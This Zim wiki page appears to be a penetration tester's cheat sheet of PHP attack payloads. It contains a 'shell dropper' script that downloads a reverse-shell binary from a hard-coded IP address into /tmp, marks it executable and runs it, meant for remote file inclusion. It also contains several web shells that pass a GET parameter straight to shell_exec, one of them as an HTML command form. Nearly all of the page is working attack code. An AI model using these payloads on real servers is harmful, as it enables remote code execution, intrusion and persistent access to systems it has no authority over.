Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-09-26T18:38:48-05:00

====== PHP ======
Created Sunday 26 September 2021

===== Shell dropper =====
{{{code: lang="php" linenumbers="True"
<?php
if (!function_exists(file_put_contents)) {
    function file_put_contents($filename, $data) {
        $f = @fopen($filename, w);
        if (!$f) {
            return false;
        } else {
            $bytes = fwrite($f, $data);
            fclose($f);
            return $bytes;
        }
    }
}

$dest = "/tmp/revshell";

echo "COPYING_SHELL
";
$contents = file_get_contents("http://192.168.119.177/revshell");
echo "GOT CONTENTS
";
echo "NOW SAVING to $dest
";
if (!file_put_contents("$dest", $contents)) {
	echo "SHELL COPY FAILED. Perhaps no write permission.
	die();
";
} else {
	echo "SHELL COPIED TO $dest.
";
}
shell_exec("chmod +x $dest");
shell_exec($dest);
?>
}}}

* See [[RFI]] for usage
* This support PHP4 and up. (file_get_contents does not exist in PHP4, so it's implemented in the code)
* This will download a reverse shell and immediately execute it
* This payload will be put in /tmp/revshell

===== Command execution =====
{{{code: lang="php" linenumbers="False"
<pre><?php echo shell_exec("<command>");?></pre>
}}}


===== Command execution through GET Param =====
{{{code: lang="php" linenumbers="False"
<pre><?php echo shell_exec($_GET['cmd']);?></pre>
# Alternatively 
<pre><?php echo shell_exec($_GET["cmd"]);?></pre>
}}}

See [[Tools:Linux:curl]] for an example how to execute the command


===== Command execution through GET Param in  a PHP file =====
{{{code: lang="php" linenumbers="False"
<html>
<body>
<form method="GET" name="<filename.php>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php echo shell_exec($_GET['cmd']);?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

}}}



===== PHPInfo =====
{{{code: lang="php" linenumbers="False"
<pre><?php phpinfo() ?></pre>
}}}


===== See =====
[[LFI]]
[[RFI]]
